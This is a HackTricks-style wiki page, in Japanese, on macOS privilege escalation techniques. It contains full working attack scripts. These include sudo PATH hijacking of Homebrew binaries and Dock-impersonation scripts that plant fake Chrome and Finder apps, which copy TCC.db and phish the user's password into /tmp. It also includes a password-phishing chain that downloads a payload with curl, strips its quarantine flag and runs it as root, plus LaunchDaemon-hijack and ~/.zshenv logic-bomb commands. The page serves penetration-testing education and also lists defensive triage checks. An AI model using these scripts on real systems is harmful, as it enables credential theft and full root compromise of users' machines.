# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalationをお探しの場合は、こちらをご覧ください:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Linuxやその他のUnix系システムに影響する多くの権限昇格テクニックは、macOSにも適用できます。こちらをご覧ください:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## ユーザー操作

### Sudo Hijacking

元の[Sudo HijackingテクニックはこちらのLinux Privilege Escalationの記事](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)にあります。

ただし、macOSではユーザーが**`sudo`**を実行するときに、ユーザーの**`PATH`**が**維持されます**。つまり、この攻撃を実現する別の方法として、被害者が**sudoの実行時に引き続き実行する別のバイナリを乗っ取る**ことができます:

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

ターミナルを使うユーザーは、**Homebrew をインストールしている可能性が非常に高い**ことに注意してください。そのため、**`/opt/homebrew/bin`** 内のバイナリを乗っ取れる可能性があります。

### Dock の偽装

**social engineering** を使えば、Dock 内でたとえば Google Chrome を**偽装**し、実際には自分のスクリプトを実行させることができます。

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
いくつかの方法を紹介します。

- Dock に Chrome があるか確認し、あればその項目を**削除**して、Dock 配列内の同じ位置に**偽の** **Chrome 項目**を**追加**します。

<details>
<summary>Chrome Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
いくつかの提案:

- **Dock から Finder を削除することはできない**ため、Dock に追加する場合は、偽の Finder を本物のすぐ隣に置くとよいでしょう。そのためには、**Dock の配列の先頭に偽の Finder エントリを追加する必要があります**。
- 別の方法として、Dock に配置せず、そのまま開くこともできます。「Finder が Finder の制御を求めています」という表示は、それほど不自然ではありません。
- 見苦しいダイアログでパスワードを求めずに**root に昇格する**別の方法は、特権操作を実行するために Finder に実際にパスワードを求めさせることです。
  - Finder に新しい **`sudo`** ファイルを **`/etc/pam.d`** にコピーさせます（パスワードを求めるプロンプトには「Finder が sudo をコピーしようとしています」と表示されます）。
  - 新しい **Authorization Plugin** を Finder にコピーさせます（ファイル名を指定できるので、パスワードを求めるプロンプトに「Finder が Finder.bundle をコピーしようとしています」と表示させられます）。

<details>
<summary>Finder Dock の偽装スクリプト</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### パスワードプロンプト phishing + sudo reuse

Malwareはユーザーの操作を悪用して、**sudoで使えるパスワードを取得し**、プログラムから再利用することがよくあります。一般的な流れは次のとおりです。

1. `whoami` でログイン中のユーザーを特定する。
2. `dscl . -authonly "$user" "$pw"` が成功を返すまで、**パスワード入力を繰り返し求める**。
3. 認証情報をキャッシュし（例：`/tmp/.pass`）、`sudo -S`（標準入力経由でパスワードを渡す）を使って特権操作を実行する。

最小限のチェーンの例：

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

盗まれたパスワードは、その後、**`xattr -c` で Gatekeeper の隔離属性を解除**したり、LaunchDaemons やその他の特権ファイルをコピーしたり、追加のステージを非対話的に実行したりするために再利用できます。<sup>[[1]](#references)</sup>

#### PAM による取得したパスワードの検証

ネイティブに見えるセキュアテキストプロンプトでアカウントパスワード候補を収集し、`dscl`、`security`、`osascript` を起動せずに、プロセス内で PAM を通じて検証できます。呼び出し元は `pam_start` で PAM トランザクションを開始し、会話コールバックを通じて候補を渡し、`pam_authenticate` を呼び出してから `pam_end` でトランザクションを終了します。検証に失敗した場合はパスワード入力欄に戻り、成功した場合は別の検証プロセスを起動せずにパスワードを確認できます。PAM 認証だけでは、呼び出し元の権限は昇格せず、特権操作が許可されるわけでもありません。<sup>[[9]](#references)[[10]](#references)</sup>

ログインパスワードと Keychain パスワードが同じ場合、取得したパスワードは、現在の Keychain パスワードが必要な操作にも使用できる可能性があります。[Keychain の ACL とパーティションリストの制約](../macos-red-teaming/macos-keychain.md)を参照してください。<sup>[[10]](#references)</sup>

## 新しい macOS 固有のベクトル（2023–2026）

### 非推奨の `AuthorizationExecuteWithPrivileges` は今も使用可能

`AuthorizationExecuteWithPrivileges` は 10.7 で非推奨になりましたが、**Sonoma/Sequoia でも今なお動作します**。多くの市販アップデーターは、信頼されていないパスを指定して `/usr/libexec/security_authtrampoline` を呼び出します。対象のバイナリがユーザーによる書き込み可能であれば、トロイの木馬を仕込み、正規のプロンプトを利用できます。

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

上記の**masquerading tricks**と組み合わせて、もっともらしいパスワードダイアログを表示します。


### Privileged helper / XPC のトリアージ

最近のサードパーティ製macOS privescの多くは、同じパターンに従います。**root権限のLaunchDaemon**が**`/Library/PrivilegedHelperTools`**にある**Mach/XPC service**を公開し、helperが**クライアントを検証しない**、検証が**遅すぎる**（PID race）、または**ユーザーが制御できるpath/script**を処理する**root権限のmethod**を公開している、というものです。これは、VPNクライアント、ゲームランチャー、アップデーターで最近見られる多くのhelperの脆弱性の原因となるバグクラスです。<sup>[[2]](#references)</sup>

簡易トリアージチェックリスト:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

次のような helper に特に注意してください。

- `launchd` にジョブが読み込まれたままになり、**アンインストール後も**リクエストを受け付け続ける
- **`/Applications/...`** や、root 以外のユーザーが書き込み可能なその他のパスからスクリプトを実行したり、設定を読み込んだりする
- 競合状態を悪用できる可能性のある **PID ベース**または **bundle-id のみ**による peer 検証に依存する

helper の認可バグについて詳しくは、[こちらのページ](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)を確認してください。

### PackageKit スクリプトの環境変数継承 (CVE-2024-27822)

Apple が **Sonoma 14.5**、**Ventura 13.6.7**、**Monterey 12.7.5** で修正するまで、ユーザーが開始した **`Installer.app`** / **`PackageKit.framework`** 経由のインストールでは、PKG スクリプトが現在のユーザーの環境内で root として実行される可能性がありました。つまり、パッケージが **`#!/bin/zsh`** を使用している場合、被害者がパッケージをインストールすると、攻撃者の **`~/.zshenv`** が読み込まれ、root として実行される可能性がありました。<sup>[[3]](#references)</sup>

これは特に **logic bomb** として興味深いものです。ユーザーアカウントへの足がかりと、書き込み可能なシェル起動ファイルさえあれば、脆弱性のある **zsh ベース**のインストーラーがユーザーによって実行されるのを待つだけです。これは一般に **MDM/Munki** のデプロイには当てはまりません。これらは root ユーザーの環境内で実行されるためです。<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

インストーラ固有の悪用について詳しく知りたい場合は、[こちらのページ](macos-files-folders-and-binaries/macos-installers-abuse.md)も確認してください。

### `.localized` を介したインストール先の衝突

一部のサードパーティ製インストーラは、実行ファイルが `/Applications/Target.app` 内の固定パスで指定された root LaunchDaemon を登録します。攻撃者が異なる bundle identifier を使って先にそのバンドルを作成できる場合、Installer は偽のバンドルを残し、本物のアプリを `/Applications/Target.localized/Target.app` に配置することがあります。LaunchDaemon は引き続き元のパスを参照します。そのため、偽のバンドル内にある攻撃者が制御する実行ファイルが、後に root 権限で実行される可能性があります。<sup>[[8]](#references)</sup>

重要な前提条件は次のとおりです。<sup>[[8]](#references)</sup>

1. 攻撃者が、想定されるアプリケーションのパスを作成または制御できる。
2. パッケージが、競合するバンドルを削除しない。
3. 特権ジョブが、そのバンドル内のハードコードされたパスを使用する。
4. ユーザーまたは MDM ワークフローがパッケージをインストールし、ジョブを登録する。

移動されたバンドルを探し、次のセクションの列挙ループを使って LaunchDaemon のターゲットを確認してください。<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

より安全なインストーラーは、最終的なバンドルの場所を解決し、特権実行ファイルを `/Library/PrivilegedHelperTools` などの root 所有の場所に保持します。また、ジョブを登録または起動する前に、所有者とコード署名を検証する必要があります。<sup>[[8]](#references)</sup>

### 書き込み可能な LaunchDaemon の実行先の乗っ取り

LaunchDaemon の plist が root 所有でも、`Program` または `ProgramArguments` の最初のエントリーがユーザーによる書き込みが可能なディレクトリを指している場合があります。実行ファイルのモードだけでなく、**パス全体**を確認してください。親ディレクトリが書き込み可能なら、攻撃者は root 所有の実行ファイルの名前を変更し、同じパスに置き換えのファイルを作成できる可能性があります。ジョブが次に起動したとき、置き換えたファイルは root 権限で実行されます。再起動や通常のサービス再起動で十分です。攻撃者は system ドメインで `launchctl bootstrap` を実行する権限を必要としません。<sup>[[7]](#references)</sup>

各実行先とその直近の親ディレクトリを最初に列挙してください。<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

ファイルまたはその親ディレクトリが書き込み可能な場合は、元のバイナリを保持し、パスを実行可能なペイロードに置き換えます。その後、すでにロードされているデーモンが再起動するのを待ちます。<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR 資格情報ポインターの競合（CVE-2025-24118）

脆弱な `kauth_cred_proc_update` の処理経路では、SMR リーダーがロックなしでポインターを読み込む一方で、非アトミックな `zalloc_ro_mut` API を使って `proc_ro.p_ucred` を更新していました。公開されているトリガーでは、特別に準備した setgid バイナリを使用します。あるスレッドが実グループ ID と実効グループ ID を切り替え、別のスレッドが `getgid()` などのシステムコールを繰り返し実行します。<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

これは完成済みの root exploit ではなく、**race primitive** として扱ってください。公開された PoC が示すのは、credential pointer の torn write です。多くの場合、最終的に kernel panic が発生します。研究者が corruption を再現できたのは Intel のみで、結果として生じる credential object を決定論的に制御する方法は示していません。Apple は macOS 15.3 で、更新処理を atomic pointer exchange に変更しました。<sup>[[4]](#references)</sup>

### Migration Assistant による SIP bypass（「Migraine」、CVE-2023-32369）

root を取得済みでも、SIP によってシステム上の場所への書き込みはブロックされます。**Migraine** の bug は、Migration Assistant の entitlement `com.apple.rootless.install.heritable` を悪用し、SIP bypass を継承する子プロセスを起動して、保護されたパス（例: `/System/Library/LaunchDaemons`）を上書きします。<sup>[[5]](#references)</sup> 攻撃の流れ:

1. 稼働中のシステムで root を取得する。
2. 細工した状態を使って `systemmigrationd` を起動し、攻撃者が制御する binary を実行させる。
3. 継承した entitlement を使って SIP 保護対象のファイルにパッチを適用し、再起動後も残るようにする。

### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 の bug class）

複数の Apple daemon は XPC 経由で **NSPredicate** object を受け入れますが、検証するのは攻撃者が制御可能な `expressionType` field のみです。任意の selector を評価する predicate を作成すると、**root/system XPC service**（例: `coreduetd`、`contextstored`）で **code execution** を実現できます。初期段階で app sandbox escape と組み合わせると、**ユーザーへの確認なしに privilege escalation** が可能になります。predicate を deserialize する一方、堅牢な visitor がない XPC endpoint を探してください。<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass と privilege escalation

**すべてのユーザー**（権限のないユーザーも含む）は、`-o noowners` を指定して Time Machine snapshot を作成・mount し、その snapshot 内の**すべてのファイルにアクセス**できます。これにより、稼働中の volume に対する所有権チェックを回避できます。必要な権限は、使用するアプリ（`Terminal` など）に **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）が付与されていることだけです。

コマンドと詳しい説明は、TCC bypasses のページにあります:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

以下は privilege escalation に役立つ可能性があります:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025年、Infostealer の年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: macOS 版 AWS Client VPN のローカル privilege escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit の privilege escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft「Migraine」SIP bypass（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS と iOS における新たな privilege escalation bug class（CVE-2023-23530/23531）](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon hijacking: 安全でないフォルダー権限を利用した privilege escalation と persistence](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [`.localized` directory を介した macOS LPE](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer: clipboard manager app を装う macOS malware](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - MacSync を詳しく調査](https://securelist.com/macsync-new-version/121383/)
